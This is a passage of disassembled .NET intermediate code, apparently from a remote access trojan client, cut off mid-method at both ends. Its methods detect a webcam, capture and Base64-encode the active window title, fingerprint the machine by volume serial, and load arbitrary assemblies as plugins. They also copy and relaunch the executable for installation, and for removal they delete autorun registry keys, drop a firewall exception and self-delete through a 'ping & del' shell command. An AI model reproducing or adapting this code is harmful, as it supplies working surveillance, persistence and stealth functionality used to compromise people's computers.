      IL_039e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_03a3:  leave.s    IL_03a5

    }  // end handler
    IL_03a5:  ldloc.1
    IL_03a6:  ldloc.2
    IL_03a7:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_03ac:  ret
  } // end of method OK::inf

  .method public static string  ENB(string& s) cil managed
  {
    // Code size       12 (0xc)
    .maxstack  1
    .locals init (string V_0)
    IL_0000:  ldarg.0
    IL_0001:  call       uint8[] j.OK::SB(string&)
    IL_0006:  call       string [mscorlib]System.Convert::ToBase64String(uint8[])
    IL_000b:  ret
  } // end of method OK::ENB

  .method public static string  DEB(string& s) cil managed
  {
    // Code size       16 (0x10)
    .maxstack  1
    .locals init (string V_0,
             uint8[] V_1)
    IL_0000:  ldarg.0
    IL_0001:  ldind.ref
    IL_0002:  call       uint8[] [mscorlib]System.Convert::FromBase64String(string)
    IL_0007:  stloc.1
    IL_0008:  ldloca.s   V_1
    IL_000a:  call       string j.OK::BS(uint8[]&)
    IL_000f:  ret
  } // end of method OK::DEB

  .method public static uint8[]  SB(string& S) cil managed
  {
    // Code size       13 (0xd)
    .maxstack  2
    .locals init (uint8[] V_0)
    IL_0000:  call       class [mscorlib]System.Text.Encoding [mscorlib]System.Text.Encoding::get_UTF8()
    IL_0005:  ldarg.0
    IL_0006:  ldind.ref
    IL_0007:  callvirt   instance uint8[] [mscorlib]System.Text.Encoding::GetBytes(string)
    IL_000c:  ret
  } // end of method OK::SB

  .method public static string  BS(uint8[]& B) cil managed
  {
    // Code size       13 (0xd)
    .maxstack  2
    .locals init (string V_0)
    IL_0000:  call       class [mscorlib]System.Text.Encoding [mscorlib]System.Text.Encoding::get_UTF8()
    IL_0005:  ldarg.0
    IL_0006:  ldind.ref
    IL_0007:  callvirt   instance string [mscorlib]System.Text.Encoding::GetString(uint8[])
    IL_000c:  ret
  } // end of method OK::BS

  .method public static uint8[]  ZIP(uint8[] B) cil managed
  {
    // Code size       101 (0x65)
    .maxstack  4
    .locals init (uint8[] V_0,
             uint8[] V_1,
             class [System]System.IO.Compression.GZipStream V_2,
             class [mscorlib]System.IO.MemoryStream V_3,
             int32 V_4,
             uint8[] V_5)
    IL_0000:  ldarg.0
    IL_0001:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor(uint8[])
    IL_0006:  stloc.3
    IL_0007:  ldloc.3
    IL_0008:  ldc.i4.0
    IL_0009:  newobj     instance void [System]System.IO.Compression.GZipStream::.ctor(class [mscorlib]System.IO.Stream,
                                                                                       valuetype [System]System.IO.Compression.CompressionMode)
    IL_000e:  stloc.2
    IL_000f:  ldc.i4.4
    IL_0010:  newarr     [mscorlib]System.Byte
    IL_0015:  stloc.1
    IL_0016:  ldloc.3
    IL_0017:  ldloc.3
    IL_0018:  callvirt   instance int64 [mscorlib]System.IO.MemoryStream::get_Length()
    IL_001d:  ldc.i4.5
    IL_001e:  conv.i8
    IL_001f:  sub.ovf
    IL_0020:  callvirt   instance void [mscorlib]System.IO.MemoryStream::set_Position(int64)
    IL_0025:  ldloc.3
    IL_0026:  ldloc.1
    IL_0027:  ldc.i4.0
    IL_0028:  ldc.i4.4
    IL_0029:  callvirt   instance int32 [mscorlib]System.IO.MemoryStream::Read(uint8[],
                                                                               int32,
                                                                               int32)
    IL_002e:  pop
    IL_002f:  ldloc.1
    IL_0030:  ldc.i4.0
    IL_0031:  call       int32 [mscorlib]System.BitConverter::ToInt32(uint8[],
                                                                      int32)
    IL_0036:  stloc.s    V_4
    IL_0038:  ldloc.3
    IL_0039:  ldc.i4.0
    IL_003a:  conv.i8
    IL_003b:  callvirt   instance void [mscorlib]System.IO.MemoryStream::set_Position(int64)
    IL_0040:  ldloc.s    V_4
    IL_0042:  ldc.i4.1
    IL_0043:  sub.ovf
    IL_0044:  ldc.i4.1
    IL_0045:  add.ovf
    IL_0046:  newarr     [mscorlib]System.Byte
    IL_004b:  stloc.0
    IL_004c:  ldloc.2
    IL_004d:  ldloc.0
    IL_004e:  ldc.i4.0
    IL_004f:  ldloc.s    V_4
    IL_0051:  callvirt   instance int32 [System]System.IO.Compression.GZipStream::Read(uint8[],
                                                                                       int32,
                                                                                       int32)
    IL_0056:  pop
    IL_0057:  ldloc.2
    IL_0058:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
    IL_005d:  ldloc.3
    IL_005e:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
    IL_0063:  ldloc.0
    IL_0064:  ret
  } // end of method OK::ZIP

  .method public static bool  Cam() cil managed
  {
    // Code size       62 (0x3e)
    .maxstack  5
    .locals init (bool V_0,
             int32 V_1,
             class [mscorlib]System.Exception V_2,
             string V_3,
             string V_4)
    .try
    {
      IL_0000:  ldc.i4.0
      IL_0001:  stloc.1
      IL_0002:  ldloc.1
      IL_0003:  conv.ovf.i2
      IL_0004:  ldc.i4.s   100
      IL_0006:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Space(int32)
      IL_000b:  stloc.3
      IL_000c:  ldloca.s   V_3
      IL_000e:  ldc.i4.s   100
      IL_0010:  ldnull
      IL_0011:  stloc.s    V_4
      IL_0013:  ldloca.s   V_4
      IL_0015:  ldc.i4.s   100
      IL_0017:  call       bool j.OK::capGetDriverDescriptionA(int16,
                                                                           string&,
                                                                           int32,
                                                                           string&,
                                                                           int32)
      IL_001c:  brfalse.s  IL_0022

      IL_001e:  ldc.i4.1
      IL_001f:  stloc.0
      IL_0020:  leave.s    IL_003c

      IL_0022:  ldloc.1
      IL_0023:  ldc.i4.1
      IL_0024:  add.ovf
      IL_0025:  stloc.1
      IL_0026:  ldloc.1
      IL_0027:  ldc.i4.4
      IL_0028:  ble.s      IL_0002

      IL_002a:  leave.s    IL_003a

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_002c:  dup
      IL_002d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0032:  stloc.2
      IL_0033:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0038:  leave.s    IL_003a

    }  // end handler
    IL_003a:  ldc.i4.0
    IL_003b:  ret

    IL_003c:  ldloc.0
    IL_003d:  ret
  } // end of method OK::Cam

  .method public static string  ACT() cil managed
  {
    // Code size       93 (0x5d)
    .maxstack  3
    .locals init (string V_0,
             native int V_1,
             string V_2,
             class [mscorlib]System.Exception V_3)
    .try
    {
      IL_0000:  call       native int j.OK::GetForegroundWindow()
      IL_0005:  stloc.1
      IL_0006:  ldloc.1
      IL_0007:  ldsfld     native int [mscorlib]System.IntPtr::Zero
      IL_000c:  call       bool [mscorlib]System.IntPtr::op_Equality(native int,
                                                                     native int)
      IL_0011:  brfalse.s  IL_001b

      IL_0013:  ldstr      ""
      IL_0018:  stloc.0
      IL_0019:  leave.s    IL_005b

      IL_001b:  ldloc.1
      IL_001c:  call       int64 [mscorlib]System.IntPtr::op_Explicit(native int)
      IL_0021:  call       int32 j.OK::GetWindowTextLength(int64)
      IL_0026:  ldc.i4.1
      IL_0027:  add.ovf
      IL_0028:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Space(int32)
      IL_002d:  stloc.2
      IL_002e:  ldloc.1
      IL_002f:  ldloca.s   V_2
      IL_0031:  ldloc.2
      IL_0032:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_0037:  call       int32 j.OK::GetWindowText(native int,
                                                                 string&,
                                                                 int32)
      IL_003c:  pop
      IL_003d:  ldloca.s   V_2
      IL_003f:  call       string j.OK::ENB(string&)
      IL_0044:  stloc.0
      IL_0045:  leave.s    IL_005b

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0047:  dup
      IL_0048:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_004d:  stloc.3
      IL_004e:  ldstr      ""
      IL_0053:  stloc.0
      IL_0054:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0059:  leave.s    IL_005b

    }  // end handler
    IL_005b:  ldloc.0
    IL_005c:  ret
  } // end of method OK::ACT

  .method public static string  HWD() cil managed
  {
    // Code size       84 (0x54)
    .maxstack  8
    .locals init (string V_0,
             int32 V_1,
             class [mscorlib]System.Exception V_2,
             string V_3,
             string V_4,
             int32 V_5,
             int32 V_6,
             string V_7)
    .try
    {
      IL_0000:  ldstr      "SystemDrive"
      IL_0005:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_000a:  ldstr      "\\"
      IL_000f:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0014:  stloc.3
      IL_0015:  ldloca.s   V_3
      IL_0017:  ldnull
      IL_0018:  stloc.s    V_4
      IL_001a:  ldloca.s   V_4
      IL_001c:  ldc.i4.0
      IL_001d:  ldloca.s   V_1
      IL_001f:  ldc.i4.0
      IL_0020:  stloc.s    V_5
      IL_0022:  ldloca.s   V_5
      IL_0024:  ldc.i4.0
      IL_0025:  stloc.s    V_6
      IL_0027:  ldloca.s   V_6
      IL_0029:  ldnull
      IL_002a:  stloc.s    V_7
      IL_002c:  ldloca.s   V_7
      IL_002e:  ldc.i4.0
      IL_002f:  call       int32 j.OK::GetVolumeInformation(string&,
                                                                        string&,
                                                                        int32,
                                                                        int32&,
                                                                        int32&,
                                                                        int32&,
                                                                        string&,
                                                                        int32)
      IL_0034:  pop
      IL_0035:  ldloc.1
      IL_0036:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Conversion::Hex(int32)
      IL_003b:  stloc.0
      IL_003c:  leave.s    IL_0052

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_003e:  dup
      IL_003f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0044:  stloc.2
      IL_0045:  ldstr      "ERR"
      IL_004a:  stloc.0
      IL_004b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0050:  leave.s    IL_0052

    }  // end handler
    IL_0052:  ldloc.0
    IL_0053:  ret
  } // end of method OK::HWD

  .method public static object  Plugin(uint8[] b,
                                       string c) cil managed
  {
    // Code size       110 (0x6e)
    .maxstack  3
    .locals init (object V_0,
             class [mscorlib]System.Reflection.Module V_1,
             class [mscorlib]System.Type V_2,
             int32 V_3,
             class [mscorlib]System.Reflection.Module[] V_4,
             int32 V_5,
             class [mscorlib]System.Type[] V_6)
    IL_0000:  ldarg.0
    IL_0001:  call       class [mscorlib]System.Reflection.Assembly [mscorlib]System.Reflection.Assembly::Load(uint8[])
    IL_0006:  callvirt   instance class [mscorlib]System.Reflection.Module[] [mscorlib]System.Reflection.Assembly::GetModules()
    IL_000b:  stloc.s    V_4
    IL_000d:  ldc.i4.0
    IL_000e:  stloc.3
    IL_000f:  br.s       IL_0065

    IL_0011:  ldloc.s    V_4
    IL_0013:  ldloc.3
    IL_0014:  ldelem.ref
    IL_0015:  stloc.1
    IL_0016:  ldloc.1
    IL_0017:  callvirt   instance class [mscorlib]System.Type[] [mscorlib]System.Reflection.Module::GetTypes()
    IL_001c:  stloc.s    V_6
    IL_001e:  ldc.i4.0
    IL_001f:  stloc.s    V_5
    IL_0021:  br.s       IL_0059

    IL_0023:  ldloc.s    V_6
    IL_0025:  ldloc.s    V_5
    IL_0027:  ldelem.ref
    IL_0028:  stloc.2
    IL_0029:  ldloc.2
    IL_002a:  callvirt   instance string [mscorlib]System.Type::get_FullName()
    IL_002f:  ldstr      "."
    IL_0034:  ldarg.1
    IL_0035:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_003a:  callvirt   instance bool [mscorlib]System.String::EndsWith(string)
    IL_003f:  brfalse.s  IL_0053

    IL_0041:  ldloc.1
    IL_0042:  callvirt   instance class [mscorlib]System.Reflection.Assembly [mscorlib]System.Reflection.Module::get_Assembly()
    IL_0047:  ldloc.2
    IL_0048:  callvirt   instance string [mscorlib]System.Type::get_FullName()
    IL_004d:  callvirt   instance object [mscorlib]System.Reflection.Assembly::CreateInstance(string)
    IL_0052:  ret

    IL_0053:  ldloc.s    V_5
    IL_0055:  ldc.i4.1
    IL_0056:  add.ovf
    IL_0057:  stloc.s    V_5
    IL_0059:  ldloc.s    V_5
    IL_005b:  ldloc.s    V_6
    IL_005d:  ldlen
    IL_005e:  conv.ovf.i4
    IL_005f:  blt.s      IL_0023

    IL_0061:  ldloc.3
    IL_0062:  ldc.i4.1
    IL_0063:  add.ovf
    IL_0064:  stloc.3
    IL_0065:  ldloc.3
    IL_0066:  ldloc.s    V_4
    IL_0068:  ldlen
    IL_0069:  conv.ovf.i4
    IL_006a:  blt.s      IL_0011

    IL_006c:  ldnull
    IL_006d:  ret
  } // end of method OK::Plugin

  .method public static void  ED() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldc.i4.0
    IL_0001:  call       void j.OK::pr(int32)
    IL_0006:  ret
  } // end of method OK::ED

  .method private static bool  CompDir(class [mscorlib]System.IO.FileInfo F1,
                                       class [mscorlib]System.IO.FileInfo F2) cil managed
  {
    // Code size       119 (0x77)
    .maxstack  3
    .locals init (bool V_0,
             class [mscorlib]System.IO.DirectoryInfo V_1,
             class [mscorlib]System.IO.DirectoryInfo V_2)
    IL_0000:  ldarg.0
    IL_0001:  callvirt   instance string [mscorlib]System.IO.FileInfo::get_Name()
    IL_0006:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_000b:  ldarg.1
    IL_000c:  callvirt   instance string [mscorlib]System.IO.FileInfo::get_Name()
    IL_0011:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_0016:  ldc.i4.0
    IL_0017:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                      string,
                                                                                                                      bool)
    IL_001c:  ldc.i4.0
    IL_001d:  beq.s      IL_0021

    IL_001f:  ldc.i4.0
    IL_0020:  ret

    IL_0021:  ldarg.0
    IL_0022:  callvirt   instance class [mscorlib]System.IO.DirectoryInfo [mscorlib]System.IO.FileInfo::get_Directory()
    IL_0027:  stloc.1
    IL_0028:  ldarg.1
    IL_0029:  callvirt   instance class [mscorlib]System.IO.DirectoryInfo [mscorlib]System.IO.FileInfo::get_Directory()
    IL_002e:  stloc.2
    IL_002f:  ldloc.1
    IL_0030:  callvirt   instance string [mscorlib]System.IO.DirectoryInfo::get_Name()
    IL_0035:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_003a:  ldloc.2
    IL_003b:  callvirt   instance string [mscorlib]System.IO.DirectoryInfo::get_Name()
    IL_0040:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_0045:  ldc.i4.0
    IL_0046:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                      string,
                                                                                                                      bool)
    IL_004b:  ldc.i4.0
    IL_004c:  ceq
    IL_004e:  brtrue.s   IL_0052

    IL_0050:  ldc.i4.0
    IL_0051:  ret

    IL_0052:  ldloc.1
    IL_0053:  callvirt   instance class [mscorlib]System.IO.DirectoryInfo [mscorlib]System.IO.DirectoryInfo::get_Parent()
    IL_0058:  stloc.1
    IL_0059:  ldloc.2
    IL_005a:  callvirt   instance class [mscorlib]System.IO.DirectoryInfo [mscorlib]System.IO.DirectoryInfo::get_Parent()
    IL_005f:  stloc.2
    IL_0060:  ldloc.1
    IL_0061:  ldnull
    IL_0062:  ceq
    IL_0064:  ldloc.2
    IL_0065:  ldnull
    IL_0066:  ceq
    IL_0068:  and
    IL_0069:  brfalse.s  IL_006d

    IL_006b:  ldc.i4.1
    IL_006c:  ret

    IL_006d:  ldloc.1
    IL_006e:  brtrue.s   IL_0072

    IL_0070:  ldc.i4.0
    IL_0071:  ret

    IL_0072:  ldloc.2
    IL_0073:  brtrue.s   IL_002f

    IL_0075:  ldc.i4.0
    IL_0076:  ret
  } // end of method OK::CompDir

  .method public static void  UNS() cil managed
  {
    // Code size       343 (0x157)
    .maxstack  4
    .locals init (class [mscorlib]System.Exception V_0,
             class [mscorlib]System.Exception V_1,
             class [mscorlib]System.Exception V_2,
             class [mscorlib]System.Exception V_3,
             class [mscorlib]System.Exception V_4,
             class [mscorlib]System.Exception V_5)
    IL_0000:  ldc.i4.0
    IL_0001:  call       void j.OK::pr(int32)
    IL_0006:  ldc.i4.0
    IL_0007:  stsfld     bool j.OK::Isu
    .try
    {
      IL_000c:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_0011:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_0016:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_001b:  ldsfld     string j.OK::sf
      IL_0020:  ldc.i4.1
      IL_0021:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_0026:  ldsfld     string j.OK::RG
      IL_002b:  ldc.i4.0
      IL_002c:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::DeleteValue(string,
                                                                                            bool)
      IL_0031:  leave.s    IL_0041

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0033:  dup
      IL_0034:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0039:  stloc.0
      IL_003a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_003f:  leave.s    IL_0041

    }  // end handler
    .try
    {
      IL_0041:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_0046:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_004b:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_LocalMachine()
      IL_0050:  ldsfld     string j.OK::sf
      IL_0055:  ldc.i4.1
      IL_0056:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_005b:  ldsfld     string j.OK::RG
      IL_0060:  ldc.i4.0
      IL_0061:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::DeleteValue(string,
                                                                                            bool)
      IL_0066:  leave.s    IL_0076

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0068:  dup
      IL_0069:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_006e:  stloc.1
      IL_006f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0074:  leave.s    IL_0076

    }  // end handler
    .try
    {
      IL_0076:  ldstr      "netsh firewall delete allowedprogram \""
      IL_007b:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_0080:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_0085:  ldstr      "\""
      IL_008a:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_008f:  ldc.i4.0
      IL_0090:  ldc.i4.0
      IL_0091:  ldc.i4.m1
      IL_0092:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_0097:  pop
      IL_0098:  leave.s    IL_00a8

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_009a:  dup
      IL_009b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00a0:  stloc.2
      IL_00a1:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00a6:  leave.s    IL_00a8

    }  // end handler
    .try
    {
      IL_00a8:  ldsfld     class [mscorlib]System.IO.FileStream j.OK::FS
      IL_00ad:  brfalse.s  IL_00d8

      IL_00af:  ldsfld     class [mscorlib]System.IO.FileStream j.OK::FS
      IL_00b4:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
      IL_00b9:  ldc.i4.7
      IL_00ba:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_00bf:  ldstr      "\\"
      IL_00c4:  ldsfld     string j.OK::RG
      IL_00c9:  ldstr      ".exe"
      IL_00ce:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_00d3:  call       void [mscorlib]System.IO.File::Delete(string)
      IL_00d8:  leave.s    IL_00e8

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00da:  dup
      IL_00db:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00e0:  stloc.3
      IL_00e1:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00e6:  leave.s    IL_00e8

    }  // end handler
    .try
    {
      IL_00e8:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_00ed:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_00f2:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_00f7:  ldstr      "Software"
      IL_00fc:  ldc.i4.1
      IL_00fd:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_0102:  ldsfld     string j.OK::RG
      IL_0107:  ldc.i4.0
      IL_0108:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::DeleteSubKey(string,
                                                                                             bool)
      IL_010d:  leave.s    IL_011e

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_010f:  dup
      IL_0110:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0115:  stloc.s    V_4
      IL_0117:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_011c:  leave.s    IL_011e

    }  // end handler
    .try
    {
      IL_011e:  ldstr      "cmd.exe /c ping 0 -n 2 & del \""
      IL_0123:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_0128:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_012d:  ldstr      "\""
      IL_0132:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0137:  ldc.i4.0
      IL_0138:  ldc.i4.0
      IL_0139:  ldc.i4.m1
      IL_013a:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_013f:  pop
      IL_0140:  leave.s    IL_0151

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0142:  dup
      IL_0143:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0148:  stloc.s    V_5
      IL_014a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_014f:  leave.s    IL_0151

    }  // end handler
    IL_0151:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_0156:  ret
  } // end of method OK::UNS

  .method public static void  INS() cil managed
  {
    // Code size       689 (0x2b1)
    .maxstack  5
    .locals init (uint8[] V_0,
             class [mscorlib]System.IO.FileStream V_1,
             class [mscorlib]System.Exception V_2,
             class [mscorlib]System.Exception V_3,
             class [mscorlib]System.Exception V_4,
             class [mscorlib]System.Exception V_5,
             class [mscorlib]System.Exception V_6,
             class [mscorlib]System.Exception V_7,
             string[] V_8)
    IL_0000:  ldc.i4     0x3e8
    IL_0005:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    IL_000a:  ldsfld     bool j.OK::Idr
    IL_000f:  brfalse    IL_011f

    IL_0014:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
    IL_0019:  ldsfld     string j.OK::DR
    IL_001e:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
    IL_0023:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_0028:  ldstr      "\\"
    IL_002d:  ldsfld     string j.OK::EXE
    IL_0032:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_0037:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_003c:  newobj     instance void [mscorlib]System.IO.FileInfo::.ctor(string)
    IL_0041:  call       bool j.OK::CompDir(class [mscorlib]System.IO.FileInfo,
                                                        class [mscorlib]System.IO.FileInfo)
    IL_0046:  brfalse.s  IL_004d

    IL_0048:  br         IL_011f

    .try
    {
      IL_004d:  ldsfld     string j.OK::DR
      IL_0052:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_0057:  ldstr      "\\"
      IL_005c:  ldsfld     string j.OK::EXE
      IL_0061:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0066:  call       bool [mscorlib]System.IO.File::Exists(string)
      IL_006b:  brfalse.s  IL_008b

      IL_006d:  ldsfld     string j.OK::DR
      IL_0072:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_0077:  ldstr      "\\"
      IL_007c:  ldsfld     string j.OK::EXE
      IL_0081:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0086:  call       void [mscorlib]System.IO.File::Delete(string)
      IL_008b:  ldsfld     string j.OK::DR
      IL_0090:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_0095:  ldstr      "\\"
      IL_009a:  ldsfld     string j.OK::EXE
      IL_009f:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00a4:  ldc.i4.1
      IL_00a5:  newobj     instance void [mscorlib]System.IO.FileStream::.ctor(string,
                                                                               valuetype [mscorlib]System.IO.FileMode)
      IL_00aa:  stloc.1
      IL_00ab:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_00b0:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_00b5:  call       uint8[] [mscorlib]System.IO.File::ReadAllBytes(string)
      IL_00ba:  stloc.0
      IL_00bb:  ldloc.1
      IL_00bc:  ldloc.0
      IL_00bd:  ldc.i4.0
      IL_00be:  ldloc.0
      IL_00bf:  ldlen
      IL_00c0:  conv.ovf.i4
      IL_00c1:  callvirt   instance void [mscorlib]System.IO.FileStream::Write(uint8[],
                                                                               int32,
                                                                               int32)
      IL_00c6:  ldloc.1
      IL_00c7:  callvirt   instance void [mscorlib]System.IO.FileStream::Flush()
      IL_00cc:  ldloc.1
      IL_00cd:  callvirt   instance void [mscorlib]System.IO.Stream::Close()
      IL_00d2:  ldsfld     string j.OK::DR
      IL_00d7:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_00dc:  ldstr      "\\"
      IL_00e1:  ldsfld     string j.OK::EXE
      IL_00e6:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00eb:  newobj     instance void [mscorlib]System.IO.FileInfo::.ctor(string)
      IL_00f0:  stsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_00f5:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_00fa:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_00ff:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string)
      IL_0104:  pop
      IL_0105:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
      IL_010a:  leave.s    IL_011f

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_010c:  dup
      IL_010d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0112:  stloc.2
      IL_0113:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
      IL_0118:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_011d:  leave.s    IL_011f

